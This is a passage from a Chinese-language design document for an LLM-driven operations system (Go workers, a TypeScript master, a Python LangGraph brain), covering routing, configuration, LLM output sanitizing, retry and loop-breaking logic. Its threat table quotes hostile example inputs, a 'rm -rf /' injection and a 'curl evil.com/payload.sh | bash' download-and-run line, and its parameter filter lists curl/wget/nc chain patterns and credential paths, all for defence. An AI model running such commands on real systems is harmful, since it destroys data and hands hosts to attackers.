│   │   └── health.ts                     # GET /health（不限流、不认证）
│   ├── protocol/
│   │   ├── envelope.ts                   # 信封编解码 + 字段完整性校验
│   │   ├── version.ts                    # 协议版本协商 + 兼容性矩阵
│   │   └── types.ts                      # TypeScript 类型定义
│   ├── orchestrator/
│   │   ├── router.ts                     # 指令路由
│   │   │   ├── 负载感知 least-loaded 算法
│   │   │   ├── Brain 指定 Worker 回退策略
│   │   │   ├── 广播路由 + 限流
│   │   │   └── 无可用 Worker 返回明确错误
│   │   ├── tracker.ts                    # 指令追踪
│   │   │   ├── pending 管理（上限 10K）
│   │   │   ├── 孤儿请求回收（基于 TTL，30s 定时）
│   │   │   ├── 断连后批量重试
│   │   │   └── 分片重组 + 超时清理（30s 超时）
│   │   ├── summarizer.ts                 # 结果摘要
│   │   │   ├── 摘要生成（减少 LLM token）
│   │   │   ├── 关键指标提取
│   │   │   └── 错误/截断信息强制保留
│   │   └── priority-queue.ts             # 三级优先级队列 + 老化防饥饿
│   ├── security/
│   │   ├── interceptor.ts                # 高危指令识别（基于 RiskLevel）
│   │   ├── approver.ts                   # 审批管理
│   │   ├── authentikate.ts               # cluster token 认证
│   │   └── audit.ts                      # 操作审计日志
│   ├── store/
│   │   ├── registry.ts                   # Worker 注册表
│   │   ├── session.ts                    # 会话状态
│   │   └── metrics.ts                    # 运行时指标（Worker 负载、队列深度、连接数）
│   └── config/
│       └── index.ts                      # 环境配置读取
├── tsconfig.json
├── package.json
└── master.yaml
```

**新增包**：
- `authentikate.ts` — 认证逻辑从 `brain-api.ts` 和 `ws-server.ts` 中抽离
- `metrics.ts` — 运行时指标收集（连接数、pending 数、队列深度），供 health 端点和日志输出

#### 4.3.5 Master 状态机

```
         ┌──────────┐
         │  Init    │  读取配置、初始化 WS 服务 + HTTP 服务
         └────┬─────┘
              │ 成功
              ▼
         ┌──────────┐
         │  Serving │  接受 Worker 连接 + Brain 请求
         └────┬─────┘
              │
         ┌────┴────┐
         │         │
         ▼         ▼
   ┌─────────┐  ┌──────────┐
   │ WS Event│  │ REST Req │
   │ 处理器   │  │ 处理器    │
   └────┬────┘  └────┬─────┘
        │            │
        ▼            ▼
   ┌──────────────────────┐
   │    Orchestrator      │
   │  路由 → 跟踪 → 摘要   │
   └──────────────────────┘
        │
        │ (收到 SIGTERM)
        ▼
   ┌──────────┐
   │  Draining│  停止接受新连接，排空 pending（最长 30s）
   └────┬─────┘
        │
        ▼
   ┌──────────┐
   │  Exit    │
   └──────────┘
```

#### 4.3.6 Master 配置模板

```yaml
# master.yaml
server:
  host: "0.0.0.0"
  port: 8080
  ws:
    max_connections: 5000
    connection_rate_limit: 50      # 连接限流：每秒最多 50 个
    heartbeat_check_interval: 30   # 僵尸节点检测间隔（秒）
  api:
    rate_limit: 120                # Brain API 限流：次/分钟

cluster_token: "********"          # 与 Worker 共享的令牌

worker:
  heartbeat_miss_tolerance: 3      # 心跳丢失容忍次数

orchestrator:
  max_pending: 10000               # tracker pending 上限
  pending_ttl: 300                 # 孤儿请求 TTL（秒）
  broadcast_timeout: 10            # 广播总超时（秒）
  chunk_timeout: 30                # 分片重组超时（秒）

priority:
  aging:
    p0_to_p1_after: 60            # 常规请求 60s 后提升
    p1_to_p2_after: 120           # 重要请求 120s 后提升

security:
  high_risk_actions:
    - action: "service.restart"
    - action: "service.stop"
    - action: "exec.run"
    - action: "process.kill"
  approval_timeout: 300            # 审批超时（秒）

logging:
  level: "info"
  format: "json"
```

### 4.4 Brain 层（Python）— 决策大脑

**定位**：系统的"大脑"，通过 LangGraph 构建推理链路，对接 LLM 进行运维决策。

**LLM 适配策略**：当前阶段通过 **Ollama API** 进行开发和功能验证（本地部署、零成本）。从架构层面抽象 `LLMAdapter` 接口，后续可无缝切换至 DeepSeek、Qwen 官方 API、Claude API 或其他商业模型。**不允许在代码中硬绑定 Ollama 特有的数据结构。**

#### 4.4.1 Brain 核心问题分析

| # | 问题 | 场景 | 后果 |
|---|------|------|------|
| 1 | **LLM 输出格式不稳定** | 本地模型 function calling 输出残缺 JSON、参数名拼错、幻觉出不存在的工具 | Planner 节点崩溃或生成有害指令 |
| 2 | **流式响应断裂** | Ollama 流式 HTTP 中途断开，收到半截 JSON | 解析异常，节点执行卡死 |
| 3 | **长对话 Token 爆炸** | Reflector 每次重试都重传完整历史，token 消耗线性增长 | LLM 上下文超限，调用费用（或本地显存）飙升 |
| 4 | **指令参数未经消毒** | LLM 生成 `disk.usage(path="/dev/null; rm -rf /")` 或 `exec.run(command="curl http://evil.com/payload.sh \| bash")` | 注入攻击直达 Worker |
| 5 | **Worker 截断响应误判** | Worker 返回 `{truncated: true, truncated_at: 2097152}`，LLM 不知道这是截断过的结果 | Brain 基于不完整数据做错误决策 |
| 6 | **LangGraph 无限自循环** | LLM 连续 3 次规划相同方案且同样失败，但 Reflector 每次都判定"换一种方式再试" | 死循环耗尽资源 |
| 7 | **Trace ID 断层** | LangGraph 多步执行中某步未透传 `trace_id` | 后续日志无法关联回原始请求 |
| 8 | **状态图对象膨胀** | State 对象累积了所有历史步骤的完整输入输出 | 每次节点调用传递的数据量越来越大 |
| 9 | **并发请求互相干扰** | 两个告警同时触发，两个 LangGraph 实例并行运行，操作同一台机器 | 指令打架，状态不一致 |
| 10 | **LLM 调用阻塞** | `requests.post(ollama_api)` 同步阻塞 30 秒，期间无法响应其他事件 | 吞吐量降为零 |
| 11 | **错误分类粗糙** | Master 返回 `error.code: EXECUTION_TIMEOUT` 和 `TOOL_PANIC` 走相同的重试逻辑 | 不该重试的（panic）在空转，该重试的（timeout）策略不对 |
| 12 | **Ollama → 其他模型迁移成本** | 不同模型的 tool calling 参数格式、streaming 事件类型完全不同 | 切换模型时 Brain 核心逻辑需要大量修改 |

#### 4.4.2 解决方案

##### 4.4.2.1 LLM 输出稳定化（解决 #1）

Brain 层不能信任 LLM 的输出格式，必须做三层校验：

```
LLM 原始输出
    │
    ▼
┌─────────────────────────────┐
│ Layer 1: JSON 修复          │  尝试修复残缺 JSON（补引号、去尾逗号）
└─────────────┬───────────────┘
              ▼
┌─────────────────────────────┐
│ Layer 2: Schema 校验        │  校验 action 是否在 tool_registry 中
│                             │  校验参数类型和必填字段
└─────────────┬───────────────┘
              ▼
┌─────────────────────────────┐
│ Layer 3: 参数消毒            │  过滤注入、路径遍历、shell 元字符
└─────────────┬───────────────┘
              ▼
         发送给 Master
```

```python
# brain/llm/sanitizer.py
import json
import re
from typing import Any, Dict, List, Optional

class LLMOutputSanitizer:
    """LLM 输出三层消毒器"""
    
    def __init__(self, tool_registry: Dict[str, Dict[str, Any]]):
        self.tool_registry = tool_registry
        # Shell 元字符正则
        self.shell_metachars = re.compile(r'[;&|`$(){}]')
        # 路径遍历正则
        self.path_traversal = re.compile(r'(\.\./|\.\.\\)')
    
    def sanitize_tool_call(self, raw: str) -> Optional[Dict[str, Any]]:
        """完整消毒流水线：修复 → 校验 → 消毒"""
        # Layer 1: JSON 修复
        parsed = self._try_fix_json(raw)
        if parsed is None:
            return None
        
        action = parsed.get("action", "")
        params = parsed.get("params", {})
        
        # Layer 2: Schema 校验
        if action not in self.tool_registry:
            return {"error": f"UNKNOWN_TOOL: {action}", "original": raw[:200]}
        
        tool_schema = self.tool_registry[action]
        missing = self._validate_params(tool_schema, params)
        if missing:
            return {"error": f"MISSING_PARAMS: {', '.join(missing)}", "original": raw[:200]}
        
        # Layer 3: 参数消毒
        sanitized_params = self._sanitize_params(action, params)
        
        return {"action": action, "params": sanitized_params}
    
    def _try_fix_json(self, raw: str) -> Optional[Dict]:
        """尝试解析并修复残缺 JSON"""
        raw = raw.strip()
        # 尝试直接解析
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            pass
        
        # 修复常见问题：去掉末尾逗号
        raw = re.sub(r',\s*}', '}', raw)
        raw = re.sub(r',\s*]', ']', raw)
        # 给 key 补引号
        raw = re.sub(r'(?<=[{,])\s*(\w+)\s*:', r'"\1":', raw)
        
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            return None
    
    def _validate_params(self, schema: Dict, params: Dict) -> List[str]:
        """校验参数是否符合工具 schema"""
        missing = []
        required = schema.get("required_params", [])
        for field in required:
            if field not in params or params[field] is None:
                missing.append(field)
        return missing
    
    def _sanitize_params(self, action: str, params: Dict) -> Dict:
        """根据工具类型执行参数消毒"""
        result = {}
        for key, value in params.items():
            if isinstance(value, str):
                # 所有字符串参数过 shell 元字符检测
                if self.shell_metachars.search(value):
                    # 记录告警日志，拒绝危险参数
                    logger.warning(f"shell metachar detected", action=action, param=key, value=value)
                    raise ParamSanitizationError(f"param '{key}' contains shell metacharacters")
                # 路径类参数过路径遍历检测
                if key in ("path", "command", "target"):
                    if self.path_traversal.search(value):
                        raise ParamSanitizationError(f"param '{key}' contains path traversal")
            result[key] = value
        return result


class ParamSanitizationError(Exception):
    pass
```

##### 4.4.2.2 流式容错（解决 #2）

```python
# brain/llm/stream_handler.py
import json
from typing import Generator, Optional

class StreamHandler:
    """Ollama 流式响应处理器，容错能力：
    1. 断连重试（自动重连一次）
    2. 半截 JSON 拼接（缓冲区累积直到完整）
    3. 空响应检测
    4. 超时兜底
    """
    
    def __init__(self, max_retries=1, timeout=60.0):
        self.max_retries = max_retries
        self.timeout = timeout
        self.buffer = ""
    
    def collect_tool_call(self, stream: Generator) -> Optional[str]:
        """从流式响应中收集完整的 tool_call JSON 字符串"""
        attempts = 0
        while attempts <= self.max_retries:
            try:
                return self._do_collect(stream)
            except (ConnectionError, TimeoutError) as e:
                attempts += 1
                if attempts > self.max_retries:
                    logger.error("stream failed after retries", error=str(e))
                    return None
                logger.warn("stream retry", attempt=attempts)
        return None
    
    def _do_collect(self, stream) -> str:
        for chunk in stream:
            self.buffer += chunk
            # 检测是否包含完整的 tool_call
            tool_call = self._extract_tool_call()
            if tool_call:
                return tool_call
        # 流结束了还没拿到 → 可能 buffer 里有半截
        if self.buffer.strip():
            return self.buffer  # 交给 sanitizer 修复
        return None
    
    def _extract_tool_call(self) -> Optional[str]:
        """尝试从缓冲区提取 tool_call JSON"""
        # Ollama 的 tool_call 在 response["message"]["tool_calls"][0]
        # 也可能直接输出 JSON
        # 这里做通用提取：找第一个 { 到匹配的 }
        depth = 0
        start = -1
        for i, ch in enumerate(self.buffer):
            if ch == '{':
                if start == -1:
                    start = i
                depth += 1
            elif ch == '}':
                depth -= 1
                if depth == 0 and start != -1:
                    candidate = self.buffer[start:i+1]
                    self.buffer = self.buffer[i+1:]
                    return candidate
        return None
```

##### 4.4.2.3 对话上下文窗口管理（解决 #3）

```python
# brain/llm/context_window.py
from typing import List, Dict

class ContextWindow:
    """
    滑动窗口上下文管理：防止 token 无限膨胀。
    
    策略：
    - 保留：系统提示词（固定） + 最新一次 Analyst 输出 + 最新一次 Plan
    - 摘要：历史执行步骤摘要（Reflector 每次迭代后生成一行摘要）
    - 丢弃：超过 5 步之前的完整输入输出
    """
    
    MAX_STEPS = 5          # 保留最近 5 步的完整记录
    MAX_TOKENS = 32000     # 目标 token 上限（适配本地模型 32K/128K）
    
    def compress(self, messages: List[Dict], summaries: List[str]) -> List[Dict]:
        """压缩消息列表到目标 token 范围内"""
        # 保留 system prompt
        result = [messages[0]] if messages and messages[0]["role"] == "system" else []
        
        # 保留最近的几步完整记录
        recent = messages[-self.MAX_STEPS:] if len(messages) > self.MAX_STEPS else messages
        
        if len(messages) > self.MAX_STEPS:
            # 插入历史摘要
            result.append({
                "role": "system",
                "content": f"[历史摘要，共 {len(summaries)} 步]:\n" + "\n".join(summaries[:-self.MAX_STEPS])
            })
        
        result.extend(recent)
        return result
```

##### 4.4.2.4 指令参数消毒（解决 #4）— 用户重点关注的过滤逻辑

Brain 作为决策层，下发给 Master 的每条指令必须经过 **参数消毒层**。这是防止注入攻击的最后一道防线（Worker 端还有一道，但 Brain 层做一层可以尽早拦截并修复）。

```python
# brain/safety/param_filter.py
"""
Brain → Master 指令参数消毒器

职责：
1. 阻止 shell 注入（; | & ` $() ）
2. 阻止路径遍历（../）
3. 阻止危险参数组合（如 exec.run 的 command 参数带网络下载）
4. 对参数长度做上限（配合 Worker 的截断策略）
5. 标记超长参数供截断
"""
import re
from typing import Any, Dict
from dataclasses import dataclass, field

@dataclass
class FilterResult:
    passed: bool
    sanitized_params: Dict[str, Any] = field(default_factory=dict)
    rejected: bool = False
    reason: str = ""
    truncated: bool = False
    original_size: int = 0


class ParamFilter:
    
    # Shell 注入模式
    SHELL_META = re.compile(r'[;&|`$()]')
    # 命令链模式：curl/wget 管道到 shell
    COMMAND_CHAIN = re.compile(r'(curl|wget|nc)\s+.*?(\||;|\`|\$\()', re.IGNORECASE)
    # 路径遍历
    PATH_TRAVERSAL = re.compile(r'(\.\./|\.\.\\)')
    # 敏感路径（禁止读取）
    SENSITIVE_PATHS = [
        "/etc/shadow", "/etc/passwd", "/etc/kubernetes/",
        "/root/.ssh/", "/var/lib/kubelet/",
    ]
    
    # 参数长度上限（与 Worker 的截断策略对齐）
    MAX_STR_PARAM_LEN = 1024        # 单个字符串参数上限
    MAX_LIST_PARAM_LEN = 100        # 列表参数元素上限
    MAX_CMD_LENGTH = 512            # 命令类参数上限
    
    def __init__(self):
        self.stats = {"blocked": 0, "passed": 0, "truncated": 0}
    
    def filter(self, action: str, params: Dict[str, Any]) -> FilterResult:
        """消毒入口"""
        result = FilterResult(passed=False, sanitized_params=dict(params))
        
        for key, value in params.items():
            if isinstance(value, str):
                check = self._check_string_param(action, key, value)
                if check["rejected"]:
                    self.stats["blocked"] += 1
                    return FilterResult(
                        passed=False, rejected=True,
                        reason=f"param '{key}' rejected: {check['reason']}"
                    )
                if check["truncated"]:
                    result.truncated = True
                    result.original_size = check["original_size"]
                result.sanitized_params[key] = check["value"]
            
            elif isinstance(value, list):
                if len(value) > self.MAX_LIST_PARAM_LEN:
                    result.truncated = True
                    result.sanitized_params[key] = value[:self.MAX_LIST_PARAM_LEN]
        
        result.passed = True
        self.stats["passed"] += 1
        return result
    
    def _check_string_param(self, action: str, key: str, value: str) -> Dict:
        """对单个字符串参数做深度检查"""
        
        # 1. 长度限制
        max_len = self.MAX_CMD_LENGTH if key in ("command", "args") else self.MAX_STR_PARAM_LEN
        original_size = len(value)
        truncated = original_size > max_len
        value = value[:max_len]
        
        # 2. Shell 注入检测
        if self.SHELL_META.search(value):
            return {"rejected": True, "reason": "shell metacharacters detected"}
        
        # 3. 命令链检测
        if self.COMMAND_CHAIN.search(value):
            return {"rejected": True, "reason": "command chain pattern detected"}
        
        # 4. 路径遍历
        if self.PATH_TRAVERSAL.search(value):
            return {"rejected": True, "reason": "path traversal detected"}
        
        # 5. 敏感路径
        for sensitive in self.SENSITIVE_PATHS:
            if sensitive in value:
                return {"rejected": True, "reason": f"access to sensitive path: {sensitive}"}
        
        return {
            "rejected": False,
            "value": value,
            "truncated": truncated,
            "original_size": original_size if truncated else 0,
        }
```

**参数消毒触发时机**：Planner 节点生成指令后、`master_client.py` 发送前。与 Worker 端的消毒形成双层防护。

```
Planner 输出 → ParamFilter.filter(action, params)
    ├── rejected → 记录日志，不发送，返回 Reflector 告知"参数被拦截，重新规划"
    └── passed → 加入 trace_id/priority/ttl → master_client.send()
```

##### 4.4.2.5 截断响应感知（解决 #5）

Brain 接收到 Worker 的截断响应后，必须在 Planner/Reflector 的 prompt 中明确告知 LLM 数据不完整：

```python
# brain/tools/master_client.py
class MasterClient:
    
    def handle_response(self, envelope: Dict) -> Dict:
        """处理 Master 回传的响应，感知截断标记"""
        payload = envelope["payload"]
        
        if payload.get("truncated"):
            original_size = payload.get("truncated_at", 0)
            logger.warn(
                "response truncated",
                trace_id=envelope["trace_id"],
                action=payload.get("action"),
                original_size=original_size,
            )
            # 在 data 中注入截断标记，Planner 和 Reflector 能看到
            payload["_truncation_notice"] = (
                f"[此响应已被截断，原始数据大小为 {original_size} 字节。"
                f"LLM 请注意：你看到的是不完整数据，不要基于此做完整结论]"
            )
        
        return payload
```

在 Agent 的 prompt 中附加处理指引：

```
当你看到 [_truncation_notice] 标记时：
- 不要假设你看到了完整的日志/输出
- 如果是排查错误，请求 Worker 缩小范围（如指定更精确的日志路径）
- 在给用户的报告中注明"输出已截断"
```

##### 4.4.2.6 自循环检测与熔断（解决 #6）

```python
# brain/core/reflector.py
class Reflector:
    
    MAX_RETRY_SAME_ACTION = 3   # 同一工具连续失败上限
    MAX_TOTAL_RETRIES = 5       # 总重试次数上限
    
    def reflect(self, state: GraphState) -> GraphState:
        """评估执行结果，阻止自循环"""
        action = state.get("last_action")
        last_error = state.get("last_error")
        
        # 自循环检测：如果连续多次都是同一个工具 + 同一个错误码
        history = state.get("execution_history", [])
        same_failures = 0
        for h in reversed(history[-5:]):  # 只看最近 5 步
            if (h.get("action") == action 
                and h.get("error_code") == last_error
                and h.get("status") == "failure"):
                same_failures += 1
            else:
                break
        
        if same_failures >= self.MAX_RETRY_SAME_ACTION:
            # 模式转换：不再重试，直接升级为人工
            state["cycle_detected"] = True
            state["needs_human"] = True
            state["conclusion"] = (
                f"检测到循环：工具 [{action}] 连续 {same_failures} 次以相同错误 [{last_error}] 失败。"
                f"判定为无法自动修复，升级到人工处理。"
            )
            return state
        
        total_retries = sum(1 for h in history if h.get("status") == "failure")
        if total_retries >= self.MAX_TOTAL_RETRIES:
            state["needs_human"] = True
            state["conclusion"] = f"总重试次数已达上限 ({self.MAX_TOTAL_RETRIES})，升级到人工。"
            return state
        
        # 正常失败处理：判断错误类型
        if self._is_retryable(last_error):
            state["action"] = "retry"
        else:
            state["action"] = "replan"
        
        return state
    
    def _is_retryable(self, error_code: str) -> bool:
        """判断错误是否可重试"""
        retryable = {"EXECUTION_TIMEOUT", "CONNECTION_RESET", "WORKER_OFFLINE", "TTL_EXPIRED"}
        non_retryable = {"TOOL_PANIC", "COMMAND_NOT_ALLOWED", "INVALID_PARAMS", "UNKNOWN_ACTION"}
        
        if error_code in retryable:
            return True
        if error_code in non_retryable:
            return False
        # 未知错误保守处理：不重试
        return False
```

**错误分类决策树**：

```
Master/Worker 返回 error_code
    │
    ├── EXECUTION_TIMEOUT      → 重试（可能是临时负载高）
    ├── CONNECTION_RESET       → 重试（网络抖动）
    ├── WORKER_OFFLINE         → 重试（等待重连或切换到其他 Worker）
    ├── TTL_EXPIRED            → 重试（请求重发）
    ├── TOOL_PANIC             → 不重试（代码 bug，人工排查）
    ├── COMMAND_NOT_ALLOWED    → 不重试（白名单限制，重新规划）
    ├── INVALID_PARAMS          → 不重试（参数错误，重新规划）
    ├── UNKNOWN_ACTION         → 不重试（LLM 幻觉，重新规划）
    ├── NO_AVAILABLE_WORKER    → 重试（等待 Worker 上线）
    └── SHUTTING_DOWN          → 重试（Worker 重启中）
```

##### 4.4.2.7 Trace ID 强制透传（解决 #7）

```python
# brain/logger/structured_logger.py
import uuid
from contextvars import ContextVar

current_trace_id: ContextVar[str] = ContextVar("trace_id", default="")
current_msg_id: ContextVar[str] = ContextVar("msg_id", default="")

def set_trace_id(trace_id: str):
    current_trace_id.set(trace_id)

def get_trace_id() -> str:
    return current_trace_id.get()

def generate_trace_id() -> str:
    return str(uuid.uuid4())
```

```python
# brain/core/state.py
from dataclasses import dataclass, field
from typing import Any, Dict, List

@dataclass
class GraphState:
    trace_id: str = ""               # LangGraph 初始化时生成
    plan: List[Dict] = field(default_factory=list)
    current_step: int = 0
    execution_history: List[Dict] = field(default_factory=list)
    needs_human: bool = False
    cycle_detected: bool = False
    conclusion: str = ""
    truncated_responses: List[bool] = field(default_factory=list)
```

强制规则：
- `GraphState` 初始化时如果没有 `trace_id` 则自动生成一个
- `master_client.py` 发送任何请求前检查 `trace_id` 是否为空，为空则拒绝发送并报错
- 所有结构化日志如果没有 `trace_id` 则以 `no-trace` 填充并输出告警

##### 4.4.2.8 状态压缩（解决 #8）

```python
# brain/core/state.py (补充)

@dataclass
class CompressedState:
    """LangGraph 节点间传递的压缩状态"""
    trace_id: str
    current_plan: List[Dict]           # 当前剩余的待执行步骤
    current_step: int
    last_result: Dict                  # 上一步执行结果（替代完整历史）
    summary: str                       # 前序步骤的文本摘要
    truncated_responses: List[bool]    # 是否遇到过截断响应
    needs_human: bool
    cycle_detected: bool
    conclusion: str
```

**策略**：
- 节点间传递 `CompressedState` 而非完整历史
- 完整历史写入结构化日志（通过 `trace_id` 可检索），不在内存中全量保留
- Refector 每次迭代生成一行文本摘要，累积到 `summary` 字段

##### 4.4.2.9 并发隔离（解决 #9）

```python
# brain/core/graph.py
import asyncio
from typing import Dict

class GraphEngine:
    """
    LangGraph 执行引擎，每个 trace_id 独立运行。
    使用 asyncio 实现并发但不共享状态。
    """
    
    def __init__(self):
        self.active_sessions: Dict[str, asyncio.Task] = {}
    
    async def start_session(self, trigger: Dict) -> str:
        """启动一个新的推理会话，返回 trace_id"""
        trace_id = generate_trace_id()
        state = GraphState(trace_id=trace_id, ...)
        
        task = asyncio.create_task(self._run_graph(state))
        self.active_sessions[trace_id] = task
        return trace_id
    
    async def _run_graph(self, state: GraphState):
        """独立的图执行循环"""
        try:
            while not self._should_terminate(state):
                state = await self._run_node(state)
        except Exception as e:
            logger.error("graph session failed", trace_id=state.trace_id, error=str(e))
        finally:
            self.active_sessions.pop(state.trace_id, None)
```

**并发安全规则**：
- 每个 `trace_id` 一个独立的 LangGraph 实例
- 操作同一台机器的请求在 Master 端排队（由 Master 的队列和控制并发），Brain 层不做额外互斥
- Brain 自身维护"正在执行中的会话列表"，可查询和管理

##### 4.4.2.10 LLM 调用异步化（解决 #10）

```python
# brain/llm/adapter.py
import asyncio
from abc import ABC, abstractmethod
from typing import AsyncGenerator, Optional

class LLMAdapter(ABC):
    """LLM 适配器抽象接口"""
    
    @abstractmethod
    async def chat_stream(
        self,
        messages: list,
        tools: Optional[list] = None,
    ) -> AsyncGenerator[str, None]:
        """流式聊天，返回 token 生成器"""
        ...
    
    @abstractmethod
    async def chat(
        self,
        messages: list,
        tools: Optional[list] = None,
        timeout: float = 30.0,
    ) -> dict:
        """非流式聊天（用于简单场景），带超时"""
        ...
```

```python
# brain/llm/ollama_adapter.py
import aiohttp
import asyncio
from typing import AsyncGenerator

class OllamaAdapter(LLMAdapter):
    """Ollama 真实适配器，使用异步 HTTP"""
    
    def __init__(self, base_url: str = "http://localhost:11434", model: str = "qwen2.5:7b"):
        self.base_url = base_url
        self.model = model
        self.session: Optional[aiohttp.ClientSession] = None
    
    async def ensure_session(self):
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession()
    
    async def chat_stream(self, messages: list, tools: Optional[list] = None) -> AsyncGenerator[str, None]:
        await self.ensure_session()
        payload = {
            "model": self.model,
            "messages": messages,
            "stream": True,
        }
        if tools:
            payload["tools"] = tools
        
        try:
            async with self.session.post(
                f"{self.base_url}/api/chat",
                json=payload,
                timeout=aiohttp.ClientTimeout(total=60),
            ) as resp:
                resp.raise_for_status()
                async for line in resp.content:
                    if line.strip():
                        yield line.decode("utf-8")
        except asyncio.TimeoutError:
            yield json.dumps({"error": "STREAM_TIMEOUT"})
        except aiohttp.ClientError as e:
            yield json.dumps({"error": f"CONNECTION_ERROR: {str(e)}"})
    
    async def chat(self, messages: list, tools: Optional[list] = None, timeout: float = 30.0) -> dict:
        await self.ensure_session()
        payload = {
            "model": self.model,
            "messages": messages,
            "stream": False,
        }
        if tools:
            payload["tools"] = tools
        
        async with self.session.post(
            f"{self.base_url}/api/chat",
            json=payload,
            timeout=aiohttp.ClientTimeout(total=timeout),
        ) as resp:
            resp.raise_for_status()
            return await resp.json()
```

##### 4.4.2.11 错误分类与差异化处理（解决 #11）

```python
# brain/agents/reflector.py (错误分类逻辑)

class ErrorClassifier:
    """将 Master/Worker 返回的错误码分类到处理策略"""
    
    STRATEGIES = {
        # 可重试类：网络抖动、临时过载
        "retry": {"EXECUTION_TIMEOUT", "CONNECTION_RESET", "WORKER_OFFLINE", 
                  "TTL_EXPIRED", "NO_AVAILABLE_WORKER", "SHUTTING_DOWN"},
        # 需重新规划：参数问题、工具问题
        "replan": {"INVALID_PARAMS", "UNKNOWN_ACTION", "COMMAND_NOT_ALLOWED", 
                   "PING_FAILED", "SERVICE_NOT_FOUND", "PATH_NOT_ALLOWED",
                   "PARAM_SANITIZED"},     # ← Brain 层自检拦截的参数问题
        # 不可恢复：代码缺陷、权限问题
        "human": {"TOOL_PANIC", "WORKER_ID_CONFLICT", "AUTH_FAILED"},
    }
    
    @classmethod
    def classify(cls, error_code: str) -> str:
        for strategy, codes in cls.STRATEGIES.items():
            if error_code in codes:
                return strategy
        return "replan"  # 未知错误保守走重新规划
```

#### 4.4.3 重构后的 Brain 目录

```
brain/
├── main.py                              # 入口：启动 asyncio 事件循环，初始化组件
├── core/
│   ├── graph.py                         # LangGraph 状态图拓扑 + 会话管理
│   ├── state.py                         # GraphState + CompressedState 定义
│   └── nodes.py                         # Analyst / Planner / Execute / Reflector 节点
├── llm/
│   ├── adapter.py                       # LLMAdapter 抽象接口（asyncio）
│   ├── ollama_adapter.py                # Ollama 适配器（aiohttp 流式）
│   ├── openai_adapter.py                # OpenAI 兼容适配器（预留）
│   ├── schemas.py                       # LLM 交互数据结构、prompt 模板
│   ├── sanitizer.py                     # LLM 输出三层消毒：JSON修复 → Schema校验 → 参数消毒
│   ├── sanitizer_test.py
│   ├── stream_handler.py                # 流式响应处理器（断连重试、JSON 拼接）
│   └── context_window.py                # 对话上下文滑动窗口（防 Token 膨胀）
├── agents/
│   ├── analyst.py                       # 分析节点：理解上下文、定义问题
│   ├── planner.py                       # 规划节点：调用 LLM 制定操作步骤
│   ├── reflector.py                     # 反思节点：评估结果、错误分类、熔断检测
│   └── reflector_test.py
├── safety/
│   ├── param_filter.py                  # Brain→Master 指令参数消毒（注入/遍历/长度）
│   ├── param_filter_test.py
│   └── error_classifier.py              # 错误分类器（retry / replan / human）
├── tools/
│   ├── master_client.py                 # Master API 调用客户端（asyncio + 重试 + 截断感知）
│   ├── master_client_test.py
│   └── tool_registry.py                 # 可用工具列表（含参数 schema）
├── logger/
│   ├── structured_logger.py             # 结构化日志（JSON + trace_id 上下文）
│   └── trace_context.py                 # ContextVar 管理 trace_id/msg_id
├── rag/
│   ├── interface.py                     # 仅定义抽象接口（暂不实现）
│   └── __init__.py
├── config.py                            # 配置管理（LLM 类型、地址、超时、过滤规则）
├── brain.yaml                           # Brain 配置文件
└── requirements.txt
```

#### 4.4.4 LangGraph 执行循环（深化版）

```
                    ┌──────────────┐
                    │   外部触发    │
                    └──────┬───────┘
                           ▼
                    ┌──────────────┐
                    │  Analyst     │  LLM 调用 → 分析上下文
                    │  (LLM)       │  输出：问题定义 + 目标状态
                    └──────┬───────┘
                           ▼
                    ┌──────────────┐
                    │  Planner     │  LLM 调用 → 制定多步计划
                    │  (LLM)       │  每步 = {action, params}
                    │  + 参数消毒   │  计划通过 ParamFilter 校验
                    └──────┬───────┘
                     ┌─────┴──────┐
                     │ 全部被拦截  │  任一步参数被 ParamFilter 拒绝
                     └─────┬──────┘  → 整份计划作废，通知 LLM 重新生成
                           ▼
                    ┌──────────────┐
             ┌────  │  Execute     │  逐条发送给 Master
             │      │  (Master)    │  等待真实执行结果
             │      └──────┬───────┘
             │             ▼
             │      ┌──────────────┐
             │      │  Reflector   │  LLM 评估执行结果
             │      │  (LLM)       │  
             │      │  + 错误分类   │  ─── 成功 → 下一步 / 结束
             │      │  + 熔断检测   │  ─── 失败 → 分类处理
             │      └──────┬───────┘
             │      ┌──────┴──────────┐
             │      │                 │
             │  retryable          replan
             │      │                 │
             │      ▼                 └──→ 回到 Planner
             │  重试当前步骤
             │  (最多 3 次)
             │      │
             └──────┘ 超过重试上限 → human
             
             特殊路径 ← ParamFilter 拒绝 → 直接回 Reflector，
             不浪费 Master/Worker 资源
```

#### 4.4.5 与 Worker 截断策略的协同总览

```
Worker 端截断:
  data > 1MB → truncated=true, data=[前1MB]
  error.raw > 100KB → truncated=true, error.raw=[前100KB]
      │
      ▼
Master 透传:
  透传 truncated 和 truncated_at 字段
      │
      ▼
Brain 感知截断:
  master_client.handle_response() 注入 _truncation_notice
  Reflector / LLM 在 prompt 中看到截断标记
      │
      ▼
Brain 决策:
  如果截断导致信息不足 → 发起更精确的查询（缩小范围）
  如果截断不影响判断 → 正常处理，报告中注明"输出已截断"
      │
      ▼
Brain 参数过滤（反向保护）:
  ParamFilter 在 Planner→Master 路径上拦截注入
  参数长度对齐 Worker 上限（字符串 1KB, 命令 512B）
  shell 注入 / 路径遍历 / 命令链 → 拒绝 + 重规划
```

**零模拟澄清**：开发阶段测试 Brain 时，必须连接真实运行的 Ollama 实例和 Master/Worker 进程。不允许用 `return "模拟响应"` 替代 LLM 调用。若 LLM 连接失败，Brain 应报错退出而非兜底返回"假数据"。

---

## 5. 执行路线图

### Phase 0：基础设施与协议（先于一切代码）

- [ ] 定义并文档化信封协议 v1（含版本协商、优先级、TTL、流控机制）
- [ ] 实现协议 JSON Schema 并生成各语言类型定义（Go struct / TS type / Python dataclass）
- [ ] 编写配置模板（`brain.yaml.example`、`master.yaml.example`、`worker.yaml.example`）
- [ ] 搭建开发环境脚本 `dev-up.sh`（检查依赖 → 按序启动 → 健康检查）
- [ ] 定义各层 JSON 日志格式标准
- [ ] 初始化三项目骨架（go.mod、package.json、Python 项目结构）
- [ ] 实现 CI 基础流水线（lint + 编译）

### Phase 1：Worker 核心（可独立运行）

- [ ] WebSocket 客户端 + 认证握手 + 自动重连（指数退避）
- [ ] 信封编解码 + 协议版本协商
- [ ] 工具注册中心 + 能力声明
- [ ] 3 个基础工具：`ping.icmp`、`service.status`、`disk.usage`
- [ ] 健康上报 + 心跳保活
- [ ] 单元测试 + 集成测试（对自己执行操作）
